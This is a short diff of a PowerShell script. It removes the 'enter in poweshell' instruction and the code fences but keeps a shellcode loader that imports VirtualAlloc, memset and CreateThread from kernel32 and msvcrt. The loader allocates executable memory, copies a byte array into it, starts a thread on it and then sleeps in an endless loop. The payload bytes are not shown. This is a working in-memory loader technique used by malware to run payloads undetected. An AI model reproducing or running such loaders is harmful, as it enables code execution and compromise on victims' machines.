@@ -1,5 +1,3 @@
-enter in poweshell:
-```
 $code = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -25,5 +23,3 @@ $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
 for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
 
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
-
-```
